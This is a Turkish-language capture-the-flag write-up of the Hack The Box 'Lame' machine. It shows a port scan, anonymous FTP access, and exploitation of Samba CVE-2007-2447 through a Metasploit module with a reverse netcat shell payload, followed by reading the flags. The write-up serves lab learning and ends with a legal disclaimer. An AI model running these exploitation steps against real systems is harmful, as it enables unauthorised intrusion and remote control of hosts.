
# 🎯 Hack The Box - Lame (10.10.10.3) Writeup

**Makine Adı:** Lame  
**IP:** 10.10.10.3  
**Zafiyet:** Samba - CVE-2007-2447  
**Amaç:** Sisteme sızmak ve `user.txt` ile `root.txt` flag'lerini ele geçirmek

---

## 🔍 1. Bilgi Toplama

### Rustscan ile Hızlı Port Taraması

```bash
rustscan -a 10.10.10.3
```

**Açık Portlar:**
- 21/tcp (FTP)
- 22/tcp (SSH)
- 139/tcp (NetBIOS)
- 445/tcp (Samba)

### Versiyon Analizi (Detaylı Bilgi)

Açık portlar üzerinde çalışan servislerin versiyonlarını inceledim. Özellikle Samba'nın eski bir versiyon olduğu dikkatimi çekti.

---

## 📂 2. FTP Servisi (Port 21)

FTP servisine anonymous olarak bağlanmayı denedim:

```bash
ftp 10.10.10.3
Name: anonymous
Password: [boş geçildi]
```

Bağlantı başarılı olsa da içeride herhangi bir işe yarar dosya veya bilgi bulunamadı.

---

## ⚠️ 3. Samba Zafiyeti (CVE-2007-2447)

Versiyon araştırmasında Samba'nın **CVE-2007-2447** zafiyetine açık olduğunu gördüm. Bu, `username map script` üzerinden komut enjeksiyonu yapılmasına olanak tanıyor.

---

## 🧨 4. Exploitation (Metasploit)

### Metasploit ile Sisteme Sızma

```bash
msfconsole
```

```bash
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set RPORT 139
set PAYLOAD cmd/unix/reverse_netcat
set LHOST [Kendi IP Adresim]
set LPORT [Dinlediğim Port]
exploit
```

> ✅ Komut başarılı → Reverse shell elde edildi

---

## 🧍‍♂️ 5. User Flag

```bash
cd /home/makis
cat user.txt
```

**Flag:**

```
HTB{user_flag_buraya}
```

---

## 👑 6. Root Flag

Shell üzerinde yetki kontrolü sonrası root erişimi sağlandı:

```bash
cd /root
cat root.txt
```

**Flag:**

```
HTB{root_flag_buraya}
```

---

## ✅ Sonuç

| Adım | Açıklama |
|------|----------|
| Port Taraması | Rustscan ile hızlı tarama |
| Servis Analizi | Samba zafiyeti tespit edildi (CVE-2007-2447) |
| FTP Erişimi | Anonymous bağlantı başarılı ancak işe yarar veri yok |
| Exploitation | Metasploit ile reverse shell alındı |
| Flagler | `user.txt` ve `root.txt` başarıyla ele geçirildi |

---

**Not:** Bu çözüm yalnızca eğitim ve CTF amaçlıdır. Gerçek sistemlerde izinsiz denemeler yasa dışıdır.
